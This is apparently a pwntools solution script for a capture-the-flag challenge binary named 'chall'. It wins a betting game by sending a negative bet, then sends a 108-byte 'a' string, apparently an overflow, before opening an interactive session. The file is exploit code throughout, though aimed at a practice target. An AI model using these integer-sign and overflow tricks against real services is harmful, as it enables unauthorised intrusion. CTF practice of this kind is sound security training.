from pwn import *

p = process('./chall')

# Game1
p.sendlineafter('Are you ready? Y/N :', b'Y')
p.sendlineafter('Bet :', b'-1000000')
for i in range(10):
    p.sendlineafter('Guess :', b'0')
# Game1 win

# Game2
p.sendlineafter('Are you ready? Y/N :', b'a'*108)
p.sendlineafter('Are you ready? Y/N :', b'Y')
p.sendlineafter('Bet :', b'1')
p.sendlineafter('Guess :', b'1')
# Game1 win

p.interactive()